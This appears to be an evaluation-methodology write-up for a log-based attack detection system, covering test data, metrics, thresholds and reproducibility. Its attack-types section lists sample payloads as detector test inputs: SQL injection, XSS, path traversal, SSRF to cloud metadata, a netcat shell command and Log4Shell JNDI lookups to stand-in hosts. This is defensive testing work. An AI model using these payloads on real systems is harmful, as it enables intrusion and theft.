# Evaluation Methodology and Results

## Overview

This document describes the comprehensive evaluation methodology used to assess the Log Risk Detection and Auto-Remediation System, including experimental setup, data generation, performance metrics, and analysis of results.

## Evaluation Goals

The evaluation aims to validate the system against the following requirements:

1. **Detection Accuracy**: P/R/F1 ≥ 0.85 for critical/high severity events
2. **Performance**: Average latency ≤ 15ms/line in balanced mode
3. **Resource Usage**: Memory peak ≤ 600MB (single process)
4. **Throughput**: ≥5,000 lines/second without crashing
5. **Output Compliance**: Proper JSONL outputs for signals, actions, and metrics

## Experimental Setup

### Test Environment

- **ML**: scikit-learn, numpy, pandas
- **API**: FastAPI, uvicorn
- **Processing**: asyncio, aiofiles
- **Configuration**: PyYAML

## Data Generation Methodology

### Test Data Strategy

To ensure reproducible and comprehensive testing, we use a seeded random number generator with deterministic patterns:

```python
# Deterministic test data generation
generator = LogGenerator(seed=42)
logs = generator.generate_mixed_logs(count=1000, attack_ratio=0.1)
```

### Attack Types Covered

1. **SQL Injection (SQLi)**:
   - Union-based attacks: `UNION SELECT username, password FROM users`
   - Boolean-based: `admin' OR '1'='1`
   - Time-based: `WAITFOR DELAY '0:0:5'`
   - Stacked queries: `SELECT * FROM users; DROP TABLE users`

2. **Cross-Site Scripting (XSS)**:
   - Reflected XSS: `<script>alert('XSS')</script>`
   - Stored XSS: `<img src=x onerror=alert(1)>`
   - DOM-based XSS: `javascript:alert('XSS')`
   - Encoded variants: `%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E`

3. **Command Injection**:
   - Command chaining: `; cat /etc/passwd`
   - Subprocess execution: `$(cat /etc/passwd)`
   - PowerShell commands: `powershell -c "Get-Process"`
   - Netcat backdoors: `nc -l -p 1337 -e /bin/bash`

4. **Path Traversal**:
   - Directory traversal: `../../../etc/passwd`
   - Windows paths: `..\..\..\windows\system32\config\sam`
   - URL-encoded: `..%2F..%2F..%2Fetc%2Fpasswd`

5. **Server-Side Request Forgery (SSRF)**:
   - Internal services: `http://localhost:8080/admin`
   - Cloud metadata: `http://169.254.169.254/latest/meta-data/`
   - File schemes: `file:///etc/passwd`

6. **Log4Shell**:
   - JNDI injection: `${jndi:ldap://evil.com/a}`
   - DNS lookup: `${jndi:dns://evil.com/poc}`
   - RMI calls: `${jndi:rmi://attacker.com/exploit}`

### Obfuscation Techniques

To test anti-evasion capabilities, attacks are generated with various obfuscation methods:

1. **Encoding Layers**:
   - URL encoding: `SELECT` → `%53%45%4C%45%43%54`
   - Hex encoding: `<script>` → `3c7363726970743e`
   - Base64 encoding: Multiple layers

2. **Case Variation**:
   - Mixed case: `SeLeCt * FrOm UsErS`
   - Random casing: `sElEcT * FrOm uSeRs`

3. **Comment Insertion**:
   - SQL comments: `SEL/**/ECT * FR/**/OM users`
   - Inline comments: `SELECT/*comment*/*FROM users`

4. **Whitespace Manipulation**:
   - Multiple spaces: `SELECT  *  FROM  users`
   - Tab separation: `SELECT\t*\tFROM\tusers`
   - Newline injection: `SELECT\n*\nFROM\nusers`

### Normal Traffic Patterns

Normal traffic includes:
- Web application requests (GET/POST/PUT/DELETE)
- API calls to legitimate endpoints
- Database queries for normal operations
- System health checks and monitoring
- User authentication and session management

## Evaluation Metrics

### Detection Metrics

1. **Precision**: TP / (TP + FP)
   - Measures accuracy of positive predictions
   - Focus: High precision to minimize false positives

2. **Recall**: TP / (TP + FN)
   - Measures ability to detect all actual threats
   - Focus: High recall to minimize false negatives

3. **F1-Score**: 2 × (Precision × Recall) / (Precision + Recall)
   - Harmonic mean of precision and recall
   - Primary metric for overall detection quality

4. **High/Critical Focus**:
   - Separate metrics for high and critical severity events
   - Weighted more heavily in overall assessment

### Performance Metrics

1. **Throughput**: Lines processed per second
   - Measures processing speed
   - Target: ≥5,000 lines/second

2. **Latency**: Average time per line
   - Measures responsiveness
   - Target: ≤15ms per line

3. **Memory Usage**: Peak RSS memory
   - Measures resource efficiency
   - Target: ≤600MB

4. **Success Rate**: Action execution success percentage
   - Measures response reliability

### Business Metrics

1. **Detection Rate**: Percentage of actual threats detected
2. **False Positive Rate**: Percentage of normal events flagged
3. **Action Effectiveness**: Success rate of automated responses
4. **Correlation Efficiency**: Events properly correlated vs. isolated

## Testing Methodology

### 1. Correctness Testing

```python
def evaluate_correctness(test_file):
    # Generate ground truth labels
    ground_truth = generate_labels(test_file)

    # Run detection system
    results = run_analyzer(test_file)

    # Calculate metrics
    y_true = [label['is_attack'] for label in ground_truth]
    y_pred = [is_detected(event) for event in results]

    precision, recall, f1 = calculate_metrics(y_true, y_pred)

    # Focus on high/critical events
    high_critical_f1 = calculate_weighted_f1(
        ground_truth, results, ['high', 'critical']
    )

    return {
        'precision': precision,
        'recall': recall,
        'f1_score': f1,
        'high_critical_f1': high_critical_f1
    }
```

### 2. Performance Testing

```python
def evaluate_performance(test_file):
    start_time = time.time()
    start_memory = get_memory_usage()

    # Run analyzer with timing
    results = run_analyzer(test_file)

    end_time = time.time()
    end_memory = get_memory_usage()

    execution_time = end_time - start_time
    throughput = len(results) / execution_time
    avg_latency = execution_time / len(results) if results else 0
    memory_peak = end_memory - start_memory

    return {
        'throughput_lps': throughput,
        'avg_latency_ms': avg_latency * 1000,
        'memory_usage_mb': memory_peak / 1024 / 1024
    }
```

### 3. Comparative Analysis

Compare different detection approaches:

1. **Rules-Only**: Disable ML and anomaly detection
2. **ML-Only**: Use only machine learning detection
3. **Hybrid**: Combined rules + ML + anomaly detection
4. **Different Modes**: fast, balanced, accurate

```python
def compare_detection_modes(test_file):
    modes = ['fast', 'balanced', 'accurate']
    results = {}

    for mode in modes:
        results[mode] = run_analyzer(test_file, mode=mode)

    return results
```

## Results Analysis

### Threshold Selection

Key thresholds and their rationale:

1. **ML Confidence Threshold**: 0.8
   - Balances false positives vs. false negatives
   - Determined through validation testing

2. **Anomaly Detection Threshold**: 0.7
   - Based on Isolation Forest contamination parameter
   - Calibrated for session-based analysis

3. **Correlation Window**: 60 seconds
   - Appropriate for most attack patterns
   - Configurable for different environments

4. **Action Rate Limit**: 100 actions/second
   - Prevents system overload
   - Allows reasonable response volume

## Reproducibility

### Seed-Based Determinism

All tests use deterministic random generation:

```bash
# Generate reproducible test data
python samples/generator.py --seed 42 --count 1000 --output test.log

# Run evaluation with same seed
python grader.py --file test.log --seed 42
```

### Environment Consistency

- Same Python version and dependencies
- Identical configuration files
- Consistent test data generation
- Deterministic ML model initialization

## Validation Testing

### Cross-Validation

For ML components, use k-fold cross-validation:

```python
from sklearn.model_selection import cross_val_score

scores = cross_val_score(
    model, X, y, cv=5, scoring='f1_weighted'
)
print(f"CV F1: {scores.mean():.3f} ± {scores.std():.3f}")
```

### Confusion Matrix Analysis

Detailed breakdown of detection performance:

```
                Predicted
Actual     Attack   Normal
Attack       TP       FN
Normal       FP       TN
```

Key insights:
- False positives: Legitimate traffic flagged as attacks
- False negatives: Actual attacks missed by system

### A/B Testing

Compare against baseline systems:
- Traditional regex-only detection
- Commercial security products
- Academic research implementations

## Continuous Evaluation

### Automated Testing Pipeline

1. **Unit Tests**: Individual component validation
2. **Integration Tests**: End-to-end pipeline testing
3. **Performance Tests**: Throughput and latency monitoring
4. **Regression Tests**: Ensure new changes don't break existing functionality

### Performance Monitoring

Real-time metrics collection:
```python
metrics = {
    'throughput': current_throughput,
    'latency_p50': percentile_50(latencies),
    'latency_p95': percentile_95(latencies),
    'memory_rss': current_memory_usage,
    'detection_f1': current_f1_score,
    'error_rate': error_count / total_count
}
```
